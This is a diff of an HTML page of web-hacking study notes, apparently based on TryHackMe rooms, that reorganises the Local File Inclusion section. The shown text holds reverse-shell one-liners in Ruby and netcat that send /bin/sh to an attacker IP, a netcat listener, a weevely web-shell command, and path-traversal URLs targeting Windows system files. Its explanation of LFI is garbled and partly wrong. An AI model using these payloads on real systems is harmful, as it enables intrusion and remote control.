@@ -107,14 +107,7 @@
     
     <h2><li>Local File Inclusion (LFI)</li></h2>
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png">
-     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png">
-     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png">
-     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png" font-size:1rem;width:833.25px;height:413.467px>
-
-     <br>if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:<br>
-     <b>http://webapp.thm/get.php?file=../../../../boot.ini</b> or <b>http://webapp.thm/get.php?file=../../../../windows/win.ini</b>
-     <br><br>
-     Normally this cause happend for file_get_contents PHP fuction.
+     <p>If website allow user to execute command in quary string after '=' sign, then this vulnerability happend.<br>Normally this cause happend for file_get_contents PHP fuction.</p>
 
     <h2><li>Remote code execution vulnerability</li></h2>
     <p>If website allow to execute code with their allow code like[their_code;attacker_code] then this vulnerability exist. <br>
@@ -134,7 +127,7 @@
     <ol>Connect with shell >> weevly [url to file] [password]</ol>
 
   <!--        Remote code execution exploit       -->
-    <h2><li>Remote code execution exploit[RCE]</li></h2>
+  <br><br>  <h2><li>Remote code execution [RCE] exploit</li></h2>
     <p>The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.<br>
     in all f these cases you need to listen for port 8080 using the foolowing command: <b>nc -vv -l -p 8080</b>
 <br><br>
@@ -155,6 +148,16 @@ ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i
 <b>Netcat</b><br>
 nc -e /bin/sh 10.20.14 8080<br>
     </p>
+
+<br><br>
+    <h2><li>Local File Inclusion (LFI) exploitation</li></h2>
+    <p>Execute command in quary string</p>
+    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png">
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png"><br>
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png" style="font-size:1rem;width:1000.25px;height:513.67px">
+
+     <br>if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:<br>
+     <b>http://webapp.thm/get.php?file=../../../../boot.ini</b> or <b>http://webapp.thm/get.php?file=../../../../windows/win.ini</b>
   </div>
    <!-- Exploitation section end here    -->
 </body>
